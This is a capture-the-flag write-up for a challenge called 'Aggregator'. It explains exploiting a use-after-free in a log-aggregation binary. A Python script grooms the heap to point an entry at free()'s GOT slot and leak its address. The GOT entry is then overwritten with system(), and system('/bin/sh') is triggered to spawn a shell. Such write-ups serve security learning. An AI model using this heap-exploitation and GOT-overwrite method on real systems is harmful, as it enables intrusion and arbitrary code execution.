# Aggregator

```
I wrote a program to help me synthesize my log files. You can edit the log files to add annotations that will print out aggregated information. Because the original program that outputs the logs was a bit faulty, I also included the ability to clear a single day of logs.

HINTS
Does it look like there is a stack vulnerability?

We noticed that there was a use-after-free error, so we played around with inputs in GDB until we got a writable data pointer that also pointed to the location of an active table entry. Then we wrote over the pointer to the table entry's data with the pointer to the GOT address of free() in order to leak the location of free to the console. We used the following python script

```python
output = "3-1-1 999\n"
output += "2-1-1 420\n"
for i in range(1, 42): # Adding 41 values to 4-1-1 causes the size to increase to 80 (10 doubles to 20 and so on)
  output += "4-1-1 " + str(i) + "\n" # This is large enough to cause a chain to be allocated over the pointer
output += "~2-1-1\n" # To be honest, I just kind of guessed from here on until I got a pointer I could use in GDB
output += "~3-1-1\n"
output += "~4-1-1\n"
output += "5-1-1\n" # Now creating 1-1-1 will have a data pointer that goes to the 4-1-1 metadata
output += "1-1-1 6299376\n" # Sets 4-1-1's data pointer to the GOT
output += "1-1-1 72340172838076673\n" # Sets the day to 1 (0x0101010101010101 as day is stored as an 8 bit unsigned integer)
output += "1-1-1 18446744073709551615\n" # Sets size to something very large
output += "1-1-1 1\n" # Size should be 1 so we can isolate the pointer
output += "1-1-1 0\n" # Next chain should be NULL
output += "am 4-1\n" # Prints the minimum of the one value pointed at by 4-1 (the GOT)
print output
```

Next we had to find the offset between the actual address of free() and system() at runtime in GDB. The values at the given GOT addresses at runtime. We did this by attaching GDB to the running process after leaking the glibc address of free. It was important to do this on a system running the same version of libc as the shell server, so we just carried out this step on the shell server.

```

The inputs after this point will change every time. They will need to take the following format.

```
aM 4-1 THIS PRINTS THE ADDRESS OF FREE
4-1-1 ADDRESS OF SYSTEM (offset: -0x3b170)
4-1-1 ADDRESS OF SYSTEM
a+ 1-1 ; /bin/sh
```

We pipe the output of the script into the program. Then we add the offset to the address for free, writing system() to the GOT entry. Finally, a line containing "; /bin/sh" is added so that program would call system("/bin/sh") when it attempts to call free(). This gives a shell. Then we just we cat the flag.
